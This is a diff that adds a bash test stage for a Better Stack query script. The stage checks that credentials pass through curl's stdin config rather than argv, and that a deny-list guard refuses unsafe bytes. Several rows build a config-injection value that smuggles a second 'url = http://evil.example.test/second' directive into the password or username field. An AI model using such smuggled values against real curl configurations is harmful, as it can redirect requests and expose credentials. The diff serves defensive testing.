@@ -1880,6 +1880,352 @@ else row "canary sweep op=enumerate, shim transport failure (curl exit 7): the s
 echo "=== stage S2-A part 2: cutover HMAC copies, refusal marker, canary sweep done ==="
 
 # =====================================================================================
+# STAGE S2-B: scripts/betterstack-query.sh. The Better Stack ClickHouse basic-auth pair leaves curl's
+# argument list (`-u USER:PASS`, readable by every local user in /proc/<pid>/cmdline) for a `user = "..."`
+# line on the stdin config channel, behind a DENY-LIST guard. The guard is the set of bytes that can break a
+# quoted config value (a double quote, a backslash, a newline) plus every control character, plus a colon in
+# the USERNAME (the first colon separates user from password), plus empties. Refusal exits 2, never 1
+# (`bs_read_classify` maps 1 to "blame DOPPLER_TOKEN"), with one value-free marker line and one stderr line
+# naming only the variable. The empty-credential case stays the script's existing exit 3 (before run_sql).
+#
+# THE INSTRUMENTS ARE CALIBRATED AGAINST THE REAL CURL, not against the author's belief: control CBS1/CBS2
+# compare the shim's parse of a `user = "..."` line with `curl --libcurl` (CURLOPT_USERPWD, and a SECOND
+# CURLOPT_URL for a hostile value), and the byte sweep runs bytes 0x01..0x7f through the real curl and then
+# through the real script, so the deny-list is validated by an oracle and not by the characters it names.
+# =====================================================================================
+BSQ="scripts/betterstack-query.sh"
+[[ -f "$BSQ" ]] || fatal "stage S2-B: $BSQ is missing"
+BSBIN="$TMPD/bsbin"; BSDIR="$TMPD/bs"
+for d in "$BSBIN" "$BSDIR"; do assert_fixture_dir "$d"; mkdir -p "$d"; done
+cat > "$BSBIN/curl" <<'BS_CURL_EOF'
+#!/usr/bin/env bash
+# Recording curl for the Better Stack reader rows. Records argv (NUL-delimited), and for `--config -` the stdin
+# verbatim plus a parse of it: a bare `user = "..."` line is the credential pair (calls/<n>.userpwd); ANY other
+# non-blank line is recorded as INJECTED (its CONTENT is never written). A `-u`/`--user` flag is recorded as
+# calls/<n>.userflag. Auth-gated: 200 only when the pair equals BS_FIXTURE_PAIR, else curl's exit 22 (401).
+set -u
+D="${BS_SHIM:?}"; mkdir -p "$D/calls"
+n=0; [[ -r "$D/counter" ]] && read -r n < "$D/counter"
+n=$((n + 1)); printf '%s\n' "$n" > "$D/counter"
+C="$D/calls/$n"
+printf '%s\0' "$@" > "$C.argv"
+unm() { printf 'UNMODELLED FLAG: %s\n' "$1" >&2; printf '%s\n' "$1" >> "$D/unmodelled"; exit 99; }
+a=("$@"); i=0; cfg=0
+while (( i < ${#a[@]} )); do
+  x="${a[i]}"; i=$((i + 1))
+  case "$x" in
+    --disable|-s|-S|-sS|--fail-with-body|--fail) : ;;
+    --noproxy|--max-time|-H|--header|-X|--request|-d|--data) i=$((i + 1)) ;;
+    --config) [[ "${a[i]:-}" == "-" ]] || unm "--config <file>"; cfg=1; i=$((i + 1)) ;;
+    -u|--user) printf 'flag\n' > "$C.userflag"; printf '%s' "${a[i]:-}" > "$C.userpwd"; i=$((i + 1)) ;;
+    --user=*) printf 'flag\n' > "$C.userflag"; printf '%s' "${x#--user=}" > "$C.userpwd" ;;
+    http*) : ;;
+    *) unm "$x" ;;
+  esac
+done
+if (( cfg )); then
+  data="$(cat; printf x)"; data="${data%x}"
+  printf '%s' "$data" > "$C.stdin"
+  ln=0
+  while IFS= read -r line || [[ -n "$line" ]]; do
+    ln=$((ln + 1)); [[ -z "$line" || "$line" == \#* ]] && continue
+    if [[ "$line" =~ ^user\ =\ \"([^\"\\]*)\"$ ]]; then printf '%s' "${BASH_REMATCH[1]}" > "$C.userpwd"
+    else printf 'INJECTED: stdin config line %s is not a bare user directive\n' "$ln" >> "$C.injected"; fi
+  done < <(printf '%s' "$data")
+fi
+ok=0
+if [[ -n "${BS_FIXTURE_PAIR:-}" && -r "$C.userpwd" ]]; then
+  got="$(cat "$C.userpwd"; printf x)"
+  [[ "$got" == "${BS_FIXTURE_PAIR}x" ]] && ok=1
+fi
+if (( ok )); then printf '{"dt":"2026-10-01 00:00:00","raw":"{}"}\n'; exit 0; fi
+printf '{"detail":"Unauthorized"}\n'
+printf 'curl: (22) The requested URL returned error: 401\n' >&2
+exit 22
+BS_CURL_EOF
+sed -i "1s|.*|#!${BASH_BIN}|" "$BSBIN/curl"
+chmod +x "$BSBIN/curl"
+
+# The real-curl oracle: decode the C literal `--libcurl` writes (octal, \xHH, \n \r \t \? \\ \" \') and report
+# how many CURLOPT_URL calls there are and whether CURLOPT_USERPWD equals the expected pair (given as hex).
+BS_DEC="$BSDIR/cdecode.py"
+cat > "$BS_DEC" <<'BS_PY_EOF'
+import re, sys
+src = open(sys.argv[1], encoding="latin-1").read()
+want = bytes.fromhex(sys.argv[2])
+urls = len(re.findall(r"CURLOPT_URL,", src))
+m = re.search(r'CURLOPT_USERPWD, "((?:[^"\\\n]|\\.)*)"\);', src)
+ok = 0
+if m:
+    s, out, i = m.group(1), bytearray(), 0
+    simple = {"n": 10, "r": 13, "t": 9, "a": 7, "b": 8, "f": 12, "v": 11}
+    while i < len(s):
+        ch = s[i]
+        if ch != "\\":
+            out += ch.encode("latin-1"); i += 1; continue
+        i += 1; e = s[i]
+        if e in simple: out.append(simple[e]); i += 1
+        elif e in "\\\"'?": out += e.encode(); i += 1
+        elif e in "01234567":
+            j = i
+            while j < len(s) and j < i + 3 and s[j] in "01234567": j += 1
+            out.append(int(s[i:j], 8) & 255); i = j
+        elif e == "x":
+            j = i + 1
+            while j < len(s) and j < i + 3 and s[j] in "0123456789abcdefABCDEF": j += 1
+            out.append(int(s[i + 1:j], 16) & 255); i = j
+        else:
+            out += ("\\" + e).encode(); i += 1
+    ok = 1 if bytes(out) == want else 0
+print("urls=%d ok=%d" % (urls, ok))
+BS_PY_EOF
+BS_OR_URLS=0; BS_OR_OK=0
+bs_oracle() { # <pair>: the REAL curl parses `user = "<pair>"` from stdin -> BS_OR_URLS, BS_OR_OK
+  local c="$BSDIR/oracle.c" hex res; rm -f "$c"
+  hex="$(printf '%s' "$1" | od -An -v -tx1 | tr -d ' \n')"
+  "$REAL_CURL" --disable --noproxy '*' -sS --max-time 3 --libcurl "$c" --config - http://127.0.0.1:9/ < <(printf 'user = "%s"\n' "$1") >/dev/null 2>&1 || true
+  res="$("$REAL_PY" -I "$BS_DEC" "$c" "$hex" 2>/dev/null || true)"
+  [[ "$res" =~ ^urls=([0-9]+)\ ok=([01])$ ]] || { BS_OR_URLS=-1; BS_OR_OK=0; return 0; }
+  BS_OR_URLS="${BASH_REMATCH[1]}"; BS_OR_OK="${BASH_REMATCH[2]}"
+}
+bs_shim_direct() { # <pair> <rowname>: the shim parses `user = "<pair>"` from stdin -> $ROWS/<rowname>/shim/calls/1.*
+  local row="$ROWS/$2"; assert_fixture_dir "$row"; mkdir -p "$row/shim"
+  ( cd "$row" && env -i PATH="$BSBIN:$REALBIN" BS_SHIM="$row/shim" "$BSBIN/curl" --disable --config - http://127.0.0.1:9/ < <(printf 'user = "%s"\n' "$1") > /dev/null 2>&1 )
+  return 0
+}
+
+BS_HEX="$(od -An -N6 -tx1 /dev/urandom | tr -d ' \n')"
+BS_USER="bsuser-$BS_HEX"
+BS_PASS="Pw-$BS_HEX"'$#;!+/=:%'
+BS_PAIR="$BS_USER:$BS_PASS"
+BS_HOST="eu-central-1a-connect.betterstackdata.com"
+BS_SQL="SELECT 1 FORMAT JSONEachRow"
+
+# CBS1: the shim and the real curl agree on a realistic pair (`$ # ; ! + / = : %` in the password).
+bs_oracle "$BS_PAIR"
+bs_shim_direct "$BS_PAIR" cbs1
+if [[ "$BS_OR_URLS" == 1 && "$BS_OR_OK" == 1 && -r "$ROWS/cbs1/shim/calls/1.userpwd" && ! -e "$ROWS/cbs1/shim/calls/1.injected" \
+      && "$(cat "$ROWS/cbs1/shim/calls/1.userpwd"; printf x)" == "${BS_PAIR}x" ]]; then
+  row "control CBS1: real curl (--libcurl) delivers the realistic pair as one CURLOPT_USERPWD and one CURLOPT_URL, and the shim parses the same pair with no INJECTED" ok
+else fatal "CBS1 oracle/shim disagree on a clean pair (urls=$BS_OR_URLS ok=$BS_OR_OK)"; fi
+# CBS2: a hostile value injects a SECOND request in real curl, and the shim records INJECTED for the same input.
+BS_HOSTILE_PW="SYNTHBSHOST${BS_HEX}x\"$(printf '\nurl = "http://evil.example.test/second')"
+bs_oracle "$BS_USER:$BS_HOSTILE_PW"
+bs_shim_direct "$BS_USER:$BS_HOSTILE_PW" cbs2
+if [[ "$BS_OR_URLS" -ge 2 && -s "$ROWS/cbs2/shim/calls/1.injected" ]]; then
+  row "control CBS2: a hostile quote+newline+url value yields a SECOND CURLOPT_URL in real curl and an INJECTED record in the shim" ok
+else fatal "CBS2 the shim did not record INJECTED for the value real curl injects a request with (urls=$BS_OR_URLS)"; fi
+
+BS_RC=0; BS_SCRIPT="$REPO_ROOT/$BSQ"; BS_ARGS=("$BS_SQL")
+bs_run() { # <rowname> <user> <pass> -> BS_RC, $ROWS/<rowname>/{stdout,stderr,shim/}   (BS_SCRIPT and BS_ARGS select script and arguments)
+  local row="$ROWS/$1"; assert_fixture_dir "$row"; mkdir -p "$row/home" "$row/tmp" "$row/shim"
+  ( cd "$row" && env -i PATH="$BSBIN:$REALBIN" HOME="$row/home" TMPDIR="$row/tmp" BS_SHIM="$row/shim" BS_FIXTURE_PAIR="$BS_PAIR" \
+      BETTERSTACK_QUERY_HOST="$BS_HOST" BETTERSTACK_QUERY_USERNAME="$2" BETTERSTACK_QUERY_PASSWORD="$3" \
+      "$BASH_BIN" "$BS_SCRIPT" "${BS_ARGS[@]}" < /dev/null > "$row/stdout" 2> "$row/stderr" )
+  BS_RC=$?
+}
+BS_MARKER_PFX='SOLEUR_CREDENTIAL_REFUSED script=betterstack-query reason='
+# bs_refusal <rowname> <reason> <variable> <canary-or-empty> -> BS_BAD (space-separated failed check names, empty = held)
+bs_refusal() {
+  local row="$ROWS/$1" reason="$2" var="$3" canary="$4" other nl
+  BS_BAD=""
+  [[ "$BS_RC" -eq 2 ]] || BS_BAD+=" rc=$BS_RC"
+  [[ "$(bk_calls "$row")" == 0 ]] || BS_BAD+=" curl-called"
+  [[ "$(grep -cxF -- "${BS_MARKER_PFX}${reason}" "$row/stderr" || true)" == 1 ]] || BS_BAD+=" marker-line"
+  [[ "$(grep -cF -- 'SOLEUR_CREDENTIAL_REFUSED' "$row/stderr" "$row/stdout" | awk -F: '{n+=$NF} END {print n+0}')" == 1 ]] || BS_BAD+=" marker-count"
+  nl="$(wc -l < "$row/stderr" | tr -d ' ')"; [[ "$nl" == 2 ]] || BS_BAD+=" stderr-lines=$nl"
+  [[ "$(grep -v 'SOLEUR_CREDENTIAL_REFUSED' "$row/stderr" | grep -cF -- "$var" || true)" == 1 ]] || BS_BAD+=" variable-line"
+  other=BETTERSTACK_QUERY_USERNAME; [[ "$var" == BETTERSTACK_QUERY_USERNAME ]] && other=BETTERSTACK_QUERY_PASSWORD
+  [[ "$(grep -cF -- "$other" "$row/stderr" || true)" == 0 ]] || BS_BAD+=" other-variable-named"
+  if [[ -n "$canary" ]]; then
+    [[ "$(grep -cF -- "$canary" "$row/stdout" "$row/stderr" | awk -F: '{n+=$NF} END {print n+0}')" == 0 ]] || BS_BAD+=" value-in-output"
+  fi
+  [[ "$(grep -cF -- 'http://evil.example.test' "$row/stdout" "$row/stderr" | awk -F: '{n+=$NF} END {print n+0}')" == 0 ]] || BS_BAD+=" injected-url-in-output"
+  [[ ! -e "$row/shim/unmodelled" ]] || BS_BAD+=" unmodelled-flag"
+  return 0
+}
+# bs_ok_call <rowname>: the invariants of a well-formed call -> BS_BAD
+bs_ok_call() {
+  local row="$ROWS/$1" f c tok
+  BS_BAD=""
+  [[ "$BS_RC" -eq 0 ]] || BS_BAD+=" rc=$BS_RC"
+  [[ "$(bk_calls "$row")" == 1 ]] || BS_BAD+=" calls=$(bk_calls "$row")"
+  c="$row/shim/calls/1"
+  [[ -r "$c.argv" ]] || { BS_BAD+=" no-argv"; return 0; }
+  [[ ! -e "$c.userflag" ]] || BS_BAD+=" user-flag-in-argv"
+  [[ ! -e "$c.injected" ]] || BS_BAD+=" injected"
+  # no -u / --user / --user= token in the recorded argv, whatever the spelling
+  [[ "$(tr '\0' '\n' < "$c.argv" | grep -cE -- '^(-u|--user|--user=.*|-[A-Za-z]*u)$' || true)" == 0 ]] || BS_BAD+=" user-token-in-argv"
+  for tok in "$BS_USER" "$BS_PASS"; do
+    [[ "$(grep -caF -- "$tok" "$c.argv" || true)" == 0 ]] || BS_BAD+=" value-in-argv"
+  done
+  [[ "$(cat "$c.stdin" 2>/dev/null; printf x)" == "user = \"$BS_PAIR\""$'\n'x ]] || BS_BAD+=" stdin-is-not-exactly-one-user-line"
+  [[ "$(grep -c '^user = "' "$c.stdin" 2>/dev/null || true)" == 1 ]] || BS_BAD+=" user-line-count"
+  [[ "$(cat "$c.userpwd" 2>/dev/null; printf x)" == "${BS_PAIR}x" ]] || BS_BAD+=" userpwd-differs"
+  # the SQL is NOT a secret and stays an argument (-d), and the request is a POST to the pinned host
+  [[ "$(tr '\0' '\n' < "$c.argv" | grep -cxF -- "$BS_SQL" || true)" == 1 ]] || BS_BAD+=" sql-not-an-argument"
+  [[ "$(tr '\0' '\n' < "$c.argv" | grep -cF -- "https://$BS_HOST?" || true)" == 1 ]] || BS_BAD+=" url"
+  [[ "$(grep -cF -- "$BS_PASS" "$row/stdout" "$row/stderr" | awk -F: '{n+=$NF} END {print n+0}')" == 0 ]] || BS_BAD+=" value-in-output"
+  [[ "$(grep -cF -- 'SOLEUR_CREDENTIAL_REFUSED' "$row/stderr" || true)" == 0 ]] || BS_BAD+=" marker-on-success"
+  [[ ! -e "$row/shim/unmodelled" ]] || BS_BAD+=" unmodelled-flag"
+  return 0
+}
+
+# --- the well-formed call: realistic pair, auth-gated shim -----------------------------------------------
+bs_run bs-ok "$BS_USER" "$BS_PASS"; bs_ok_call bs-ok
+if [[ -z "$BS_BAD" ]]; then row "betterstack-query: a well-formed pair reaches curl as exactly one 'user = \"...\"' stdin line; no -u/--user/--user= token and neither value in argv; the SQL stays a -d argument; the shim authenticates it" ok
+else row "betterstack-query: a well-formed pair reaches curl as exactly one 'user = \"...\"' stdin line; no -u/--user/--user= token and neither value in argv; the SQL stays a -d argument; the shim authenticates it" fail "checks:$BS_BAD"; fi
+# must-PASS, not the canonical: the password carries `$ # ; ! + / = : %`, checked by USERPWD equality in the shim AND by replaying the
+# recorded stdin through the REAL curl (CURLOPT_USERPWD equal, one CURLOPT_URL).
+c="$ROWS/bs-ok/shim/calls/1.stdin"
+bs_replay="$BSDIR/replay.c"; rm -f "$bs_replay"
+"$REAL_CURL" --disable --noproxy '*' -sS --max-time 3 --libcurl "$bs_replay" --config - http://127.0.0.1:9/ < "$c" >/dev/null 2>&1 || true
+bs_res="$("$REAL_PY" -I "$BS_DEC" "$bs_replay" "$(printf '%s' "$BS_PAIR" | od -An -v -tx1 | tr -d ' \n')" 2>/dev/null || true)"
+if [[ "$bs_res" == "urls=1 ok=1" && "$(grep -c '[$#;!]' <<< "$BS_PASS" || true)" == 1 ]]; then
+  row "betterstack-query: a real-shaped password containing \$ # ; ! + / = : % is delivered intact (recorded stdin replayed through real curl: one URL, USERPWD equal)" ok
+else row "betterstack-query: a real-shaped password containing \$ # ; ! + / = : % is delivered intact (recorded stdin replayed through real curl: one URL, USERPWD equal)" fail "replay=$bs_res"; fi
+# the same guard sits on mode 2 (convenience flags): one run_sql, both modes
+BS_ARGS=(--since 1h --no-archive); bs_run bs-ok-mode2 "$BS_USER" "$BS_PASS"
+BS_ARGS=("$BS_SQL")
+if [[ "$BS_RC" -eq 0 && "$(bk_calls "$ROWS/bs-ok-mode2")" == 1 && ! -e "$ROWS/bs-ok-mode2/shim/calls/1.userflag" \
+      && "$(cat "$ROWS/bs-ok-mode2/shim/calls/1.userpwd"; printf x)" == "${BS_PAIR}x" ]]; then
+  row "betterstack-query: mode 2 (convenience flags) sends the same single stdin user line and no -u" ok
+else row "betterstack-query: mode 2 (convenience flags) sends the same single stdin user line and no -u" fail "rc=$BS_RC"; fi
+
+# --- refusal rows: every one keys on the MARKER line (and its reason), the exit code is only one of the checks ---
+BS_CAN="SYNTHBSCANARY$BS_HEX"
+bs_refuse_row() { # <label> <user> <pass> <reason> <variable> [canary]
+  bs_run "bsr-$1" "$2" "$3"; bs_refusal "bsr-$1" "$4" "$5" "${6:-$BS_CAN}"
+  if [[ -z "$BS_BAD" ]]; then row "betterstack-query refuses $1: exit 2, zero curl calls, marker once (reason $4), one stderr line naming only $5, value absent from output" ok
+  else row "betterstack-query refuses $1: exit 2, zero curl calls, marker once (reason $4), one stderr line naming only $5, value absent from output" fail "checks:$BS_BAD"; fi
+}
+bs_refuse_row "a double quote in the username" "${BS_CAN}u\"x" "$BS_PASS" token_shape BETTERSTACK_QUERY_USERNAME
+bs_refuse_row "a double quote in the password" "$BS_USER" "${BS_CAN}p\"x" token_shape BETTERSTACK_QUERY_PASSWORD
+bs_refuse_row "a backslash in the username" "${BS_CAN}u\\x" "$BS_PASS" token_shape BETTERSTACK_QUERY_USERNAME
+bs_refuse_row "a backslash in the password" "$BS_USER" "${BS_CAN}p\\x" token_shape BETTERSTACK_QUERY_PASSWORD
+bs_refuse_row "a carriage return in the password" "$BS_USER" "${BS_CAN}p"$'\r'"x" control_char BETTERSTACK_QUERY_PASSWORD
+bs_refuse_row "a carriage return in the username" "${BS_CAN}u"$'\r'"x" "$BS_PASS" control_char BETTERSTACK_QUERY_USERNAME
+bs_refuse_row "a line feed in the password" "$BS_USER" "${BS_CAN}p"$'\n'"x" control_char BETTERSTACK_QUERY_PASSWORD
+bs_refuse_row "a line feed in the username" "${BS_CAN}u"$'\n'"x" "$BS_PASS" control_char BETTERSTACK_QUERY_USERNAME
+bs_refuse_row "a tab in the password" "$BS_USER" "${BS_CAN}p"$'\t'"x" control_char BETTERSTACK_QUERY_PASSWORD
+bs_refuse_row "a tab in the username" "${BS_CAN}u"$'\t'"x" "$BS_PASS" control_char BETTERSTACK_QUERY_USERNAME
+bs_refuse_row "a colon in the username" "${BS_CAN}u:x" "$BS_PASS" token_shape BETTERSTACK_QUERY_USERNAME
+bs_refuse_row "a quote together with a control character (control_char wins the reason)" "$BS_USER" "${BS_CAN}p\"x"$'\r' control_char BETTERSTACK_QUERY_PASSWORD
+bs_refuse_row "the hostile config-injection value (quote, newline, a second url directive)" "$BS_USER" "${BS_CAN}x\"$(printf '\nurl = "http://evil.example.test/second')" control_char BETTERSTACK_QUERY_PASSWORD
+bs_refuse_row "the hostile config-injection value in the username" "${BS_CAN}x\"$(printf '\nurl = "http://evil.example.test/second')" "$BS_PASS" control_char BETTERSTACK_QUERY_USERNAME
+# a colon in the PASSWORD is legal (only the first colon separates): it is the must-PASS side of the same split, covered by bs-ok above.
+BS_ARGS=(--since 1h --no-archive); bs_run bsr-mode2 "$BS_USER" "${BS_CAN}p\"x"; bs_refusal bsr-mode2 token_shape BETTERSTACK_QUERY_PASSWORD "$BS_CAN"; BS_ARGS=("$BS_SQL")
+if [[ -z "$BS_BAD" ]]; then row "betterstack-query refuses a double quote in the password in mode 2 as well: exit 2, zero calls, marker once" ok
+else row "betterstack-query refuses a double quote in the password in mode 2 as well: exit 2, zero calls, marker once" fail "checks:$BS_BAD"; fi
+# the empty-credential case is the script's EXISTING exit 3 ("credentials absent", before run_sql): pinned, with no marker and no call
+for cred in "empty username:|$BS_PASS" "empty password:$BS_USER|" "both empty:|"; do
+  clabel="${cred%%:*}"; cval="${cred#*:}"; cu="${cval%%|*}"; cp="${cval#*|}"
+  bs_run "bsr-$clabel" "$cu" "$cp"
+  if [[ "$BS_RC" -eq 3 && "$(bk_calls "$ROWS/bsr-$clabel")" == 0 && "$(grep -cF 'SOLEUR_CREDENTIAL_REFUSED' "$ROWS/bsr-$clabel/stderr" || true)" == 0 ]] \
+     && grep -qF 'not set' "$ROWS/bsr-$clabel/stderr"; then
+    row "betterstack-query: $clabel stays the existing exit 3 (credentials absent, before run_sql): zero calls and no refusal marker" ok
+  else row "betterstack-query: $clabel stays the existing exit 3 (credentials absent, before run_sql): zero calls and no refusal marker" fail "rc=$BS_RC"; fi
+done
+
+# --- the byte sweep: bytes 0x01..0x7f in each position through the REAL curl (oracle) and then the REAL script ---
+# Expected refusal set = every control character, the double quote, the backslash and (username only) the colon. The oracle
+# must show EXACTLY the quote, the backslash and the newline changing parsing, so the guard is a superset of what real curl needs.
+bs_sweep() { # <user|pass> -> BS_SW_N BS_SW_ORACLE_CHANGED BS_SW_REFUSED BS_SW_MISS BS_SW_BADREF BS_SW_BADPASS
+  local pos="$1" b hx ch v u p pair want got
+  BS_SW_N=0; BS_SW_ORACLE_CHANGED=""; BS_SW_REFUSED=""; BS_SW_MISS=""; BS_SW_BADREF=""; BS_SW_BADPASS=""
+  for b in $(seq 1 127); do
+    printf -v hx '%02x' "$b"; printf -v ch "\\x$hx"
+    v="Q${ch}R"
+    if [[ "$pos" == user ]]; then u="$v"; p="pw-sweep"; else u="usr-sweep"; p="$v"; fi
+    pair="$u:$p"
+    bs_oracle "$pair"
+    bs_run "bsw-$pos-$hx" "$u" "$p"
+    BS_SW_N=$((BS_SW_N + 1))
+    if [[ "$BS_OR_URLS" != 1 || "$BS_OR_OK" != 1 ]]; then BS_SW_ORACLE_CHANGED+=" $hx"; fi
+    if [[ "$BS_RC" -eq 2 && "$(bk_calls "$ROWS/bsw-$pos-$hx")" == 0 ]]; then
+      BS_SW_REFUSED+=" $hx"
+    else
+      # not refused: it must have reached the shim, and the shim must have parsed EXACTLY this pair (no -u, no INJECTED)
+      got="$(cat "$ROWS/bsw-$pos-$hx/shim/calls/1.userpwd" 2>/dev/null; printf x)"
+      if [[ "$(bk_calls "$ROWS/bsw-$pos-$hx")" != 1 || -e "$ROWS/bsw-$pos-$hx/shim/calls/1.injected" || -e "$ROWS/bsw-$pos-$hx/shim/calls/1.userflag" || "$got" != "${pair}x" ]]; then
+        BS_SW_BADPASS+=" $hx"
+      fi
+    fi
+  done
+  for hx in $BS_SW_ORACLE_CHANGED; do [[ " $BS_SW_REFUSED " == *" $hx "* ]] || BS_SW_MISS+=" $hx"; done
+}
+BS_SW_EXPECT_PW="$(for b in $(seq 1 127); do case "$b" in 34|92|127) printf '%02x\n' "$b" ;; *) [[ "$b" -le 31 ]] && printf '%02x\n' "$b" ;; esac; done | paste -sd' ' -)"
+BS_SW_EXPECT_USER="$(for b in $(seq 1 127); do case "$b" in 34|92|58|127) printf '%02x\n' "$b" ;; *) [[ "$b" -le 31 ]] && printf '%02x\n' "$b" ;; esac; done | paste -sd' ' -)"
+for pos in user pass; do
+  bs_sweep "$pos"
+  want="$BS_SW_EXPECT_PW"; [[ "$pos" == user ]] && want="$BS_SW_EXPECT_USER"
+  gotset="$(printf '%s\n' $BS_SW_REFUSED | paste -sd' ' -)"
+  if [[ "$BS_SW_N" == 127 && "$(printf '%s\n' $BS_SW_ORACLE_CHANGED | paste -sd' ' -)" == "0a 22 5c" && -z "$BS_SW_MISS" ]]; then
+    row "byte sweep ($pos position, 0x01-0x7f x real curl): exactly 0x0a, 0x22 and 0x5c change config parsing, and the script refuses every one of them" ok
+  else row "byte sweep ($pos position, 0x01-0x7f x real curl): exactly 0x0a, 0x22 and 0x5c change config parsing, and the script refuses every one of them" fail "n=$BS_SW_N oracle-changed:$BS_SW_ORACLE_CHANGED missed:$BS_SW_MISS"; fi
+  if [[ "$gotset" == "$want" && -z "$BS_SW_BADPASS" ]]; then
+    row "byte sweep ($pos position): the refusal set is exactly the control characters, the quote, the backslash$([[ "$pos" == user ]] && printf ' and the colon'); every other byte reaches curl intact as one user line" ok
+  else row "byte sweep ($pos position): the refusal set is exactly the control characters, the quote, the backslash$([[ "$pos" == user ]] && printf ' and the colon'); every other byte reaches curl intact as one user line" fail "refused:[$gotset] want:[$want] mangled-or-missing:$BS_SW_BADPASS"; fi
+done
+
+# --- static rows over the real script ---------------------------------------------------------------------
+BS_RUNSQL="$BSDIR/run_sql.txt"; awk '/^run_sql\(\) \{$/{f=1} f{print} f&&/^}$/{exit}' "$BSQ" > "$BS_RUNSQL"
+bs_code="$(grep -vE '^[[:space:]]*#' "$BSQ")"
+n_ut="$(grep -cE -- '(^|[[:space:]"])(-u|--user|--user=[^[:space:]]*)([[:space:]"]|$)' <<< "$bs_code" || true)"
+if [[ -s "$BS_RUNSQL" && "$n_ut" == 0 ]]; then row "static: no -u / --user / --user= token remains in any non-comment line of betterstack-query.sh" ok
+else row "static: no -u / --user / --user= token remains in any non-comment line of betterstack-query.sh" fail "run_sql_bytes=$(wc -c < "$BS_RUNSQL") user-tokens=$n_ut"; fi
+bs_first="$(grep -m1 'curl ' "$BS_RUNSQL" || true)"
+if [[ "$bs_first" == *"curl --disable --noproxy '*'"* && "$(grep -c -- '--config - < <(printf '"'"'user = "%s:%s"\\n'"'"'' "$BS_RUNSQL" || true)" == 1 ]]; then
+  row "static: run_sql keeps --disable --noproxy '*' first and feeds --config - from a process substitution (never printf | curl)" ok
+else row "static: run_sql keeps --disable --noproxy '*' first and feeds --config - from a process substitution (never printf | curl)" fail "first=$bs_first"; fi
+bs_g_ln="$(grep -n -m1 '_bs_credential_guard$' "$BS_RUNSQL" | cut -d: -f1)"; bs_c_ln="$(grep -n -m1 'curl --disable' "$BS_RUNSQL" | cut -d: -f1)"
+if [[ -n "$bs_g_ln" && -n "$bs_c_ln" && "$bs_g_ln" -lt "$bs_c_ln" ]]; then row "static: the credential guard is called in run_sql before the curl call" ok
+else row "static: the credential guard is called in run_sql before the curl call" fail "guard=$bs_g_ln curl=$bs_c_ln"; fi
+
+# --- MUTATIONS of the real script: each must turn the named refusal row RED ----------------------------
+bs_mut() { # <mutant> <from> <to> -> sets BS_SCRIPT to the mutated copy
+  BS_SCRIPT="$BSDIR/mut-$1.sh"; mutated_copy "$REPO_ROOT/$BSQ" "$BS_SCRIPT" "$2" "$3"
+}
+BS_GUARD_CALL='_bs_credential_guard
+  curl --disable'
+bs_mut noguard "$BS_GUARD_CALL" ':
+  curl --disable'
+bs_run bsm-noguard "$BS_USER" "${BS_CAN}x\"$(printf '\nurl = "http://evil.example.test/second')"
+bs_refusal bsm-noguard control_char BETTERSTACK_QUERY_PASSWORD "$BS_CAN"
+if [[ "$(bk_calls "$ROWS/bsm-noguard")" == 1 && -s "$ROWS/bsm-noguard/shim/calls/1.injected" && " $BS_BAD " == *" curl-called "* && " $BS_BAD " == *" marker-line "* ]]; then
+  row "mutation: the guard call removed lets the hostile value reach curl and the shim records INJECTED (the refusal row goes RED on curl-called and marker-line)" ok
+else row "mutation: the guard call removed lets the hostile value reach curl and the shim records INJECTED (the refusal row goes RED on curl-called and marker-line)" fail "calls=$(bk_calls "$ROWS/bsm-noguard") checks:$BS_BAD"; fi
+bs_mut noquote '*\"*|*\\*) _bs_refuse BETTERSTACK_QUERY_PASSWORD token_shape' '*\\*) _bs_refuse BETTERSTACK_QUERY_PASSWORD token_shape'
+bs_run bsm-noquote "$BS_USER" "${BS_CAN}p\"x"; bs_refusal bsm-noquote token_shape BETTERSTACK_QUERY_PASSWORD "$BS_CAN"
+if [[ " $BS_BAD " == *" curl-called "* && " $BS_BAD " == *" marker-line "* ]]; then row "mutation: dropping the quote check from the password arm turns the password-quote row RED" ok
+else row "mutation: dropping the quote check from the password arm turns the password-quote row RED" fail "checks:$BS_BAD"; fi
+bs_mut nobackslash '*\"*|*\\*) _bs_refuse BETTERSTACK_QUERY_PASSWORD token_shape' '*\"*) _bs_refuse BETTERSTACK_QUERY_PASSWORD token_shape'
+bs_run bsm-nobackslash "$BS_USER" "${BS_CAN}p\\x"; bs_refusal bsm-nobackslash token_shape BETTERSTACK_QUERY_PASSWORD "$BS_CAN"
+if [[ " $BS_BAD " == *" curl-called "* && " $BS_BAD " == *" marker-line "* ]]; then row "mutation: dropping the backslash check from the password arm turns the password-backslash row RED" ok
+else row "mutation: dropping the backslash check from the password arm turns the password-backslash row RED" fail "checks:$BS_BAD"; fi
+bs_mut nocolon "''|*:*|*\\\"*|*\\\\*) _bs_refuse BETTERSTACK_QUERY_USERNAME token_shape" "''|*\\\"*|*\\\\*) _bs_refuse BETTERSTACK_QUERY_USERNAME token_shape"
+bs_run bsm-nocolon "${BS_CAN}u:x" "$BS_PASS"; bs_refusal bsm-nocolon token_shape BETTERSTACK_QUERY_USERNAME "$BS_CAN"
+if [[ " $BS_BAD " == *" curl-called "* && " $BS_BAD " == *" marker-line "* ]]; then row "mutation: dropping the colon check from the username arm turns the colon-in-username row RED" ok
+else row "mutation: dropping the colon check from the username arm turns the colon-in-username row RED" fail "checks:$BS_BAD"; fi
+bs_mut nocntrl '*[[:cntrl:]]*) _bs_refuse BETTERSTACK_QUERY_PASSWORD control_char' '*) :'
+bs_run bsm-nocntrl "$BS_USER" "${BS_CAN}p"$'\t'"x"; bs_refusal bsm-nocntrl control_char BETTERSTACK_QUERY_PASSWORD "$BS_CAN"
+if [[ " $BS_BAD " == *" curl-called "* && " $BS_BAD " == *" marker-line "* ]]; then row "mutation: dropping the control-character check from the password arm turns the tab-in-password row RED" ok
+else row "mutation: dropping the control-character check from the password arm turns the tab-in-password row RED" fail "checks:$BS_BAD"; fi
+bs_mut exit1 'exit 2
+}' 'exit 1
+}'
+bs_run bsm-exit1 "$BS_USER" "${BS_CAN}p\"x"; bs_refusal bsm-exit1 token_shape BETTERSTACK_QUERY_PASSWORD "$BS_CAN"
+if [[ " $BS_BAD " == *" rc=1 "* && " $BS_BAD " != *" curl-called "* ]]; then row "mutation: a refusal that exits 1 (the reader-exit-1 class that blames DOPPLER_TOKEN) turns the refusal row RED on the exit code alone" ok
